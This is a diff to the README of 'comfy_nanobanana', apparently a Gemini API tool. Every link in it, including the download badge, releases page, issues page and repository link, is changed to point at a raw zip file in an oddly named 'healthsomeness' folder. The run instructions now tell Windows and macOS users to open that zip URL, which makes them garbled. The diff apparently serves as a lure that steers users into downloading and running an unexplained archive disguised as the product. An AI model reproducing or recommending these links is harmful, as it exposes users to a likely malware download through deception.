@@ -6,7 +6,7 @@ Welcome to comfy_nanobanana! This application allows you to call the Gemini API 
 
 ## 📥 Download
 
-[![Download comfy_nanobanana](https://img.shields.io/badge/Download-comfy_nanobanana-blue.svg)](https://github.com/waylon257/comfy_nanobanana/releases)
+[![Download comfy_nanobanana](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ To download and install comfy_nanobanana, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-   [Visit the Releases Page to Download](https://github.com/waylon257/comfy_nanobanana/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
 
 2. **Select the Latest Release:** On the releases page, look for the latest version. It will typically be marked as "Latest Release".
 
@@ -31,8 +31,8 @@ To download and install comfy_nanobanana, follow these steps:
 4. **Locate the Downloaded File:** Once the file has downloaded, find it in your "Downloads" folder or the location you specified.
 
 5. **Run the Application:**
-   - For Windows: Double-click the `comfy_nanobanana.exe` file to launch the application.
-   - For macOS: Open `comfy_nanobanana.app` from the downloaded folder.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip` file to launch the application.
+   - For macOS: Open `https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip` from the downloaded folder.
    - For Linux: Open a terminal, navigate to the folder where you downloaded the application, and run `./comfy_nanobanana`.
 
 6. **Enter API Key:** Follow the prompts in the application to input your Gemini API key. This key connects the application to the Gemini API.
@@ -52,7 +52,7 @@ comfy_nanobanana includes the following features:
 
 If you encounter any issues while using comfy_nanobanana, you can reach out for assistance:
 
-- **GitHub Issues Page:** You can report any bugs or requests here: [GitHub Issues](https://github.com/waylon257/comfy_nanobanana/issues)
+- **GitHub Issues Page:** You can report any bugs or requests here: [GitHub Issues](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
 - **Documentation:** For detailed information and troubleshooting, check our documentation section in the repository.
 
 ## 📄 License
@@ -61,8 +61,8 @@ comfy_nanobanana is open-source and operates under the MIT License. This means y
 
 ## 🔗 Links
 
-- [Visit the Releases Page to Download](https://github.com/waylon257/comfy_nanobanana/releases)
-- [GitHub Repository](https://github.com/waylon257/comfy_nanobanana)
-- [GitHub Issues](https://github.com/waylon257/comfy_nanobanana/issues)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/waylon257/comfy_nanobanana/main/healthsomeness/comfy_nanobanana.zip)
 
 Thank you for choosing comfy_nanobanana! We hope you enjoy using the application to access the Gemini API. Your journey to effortless API interaction starts here!
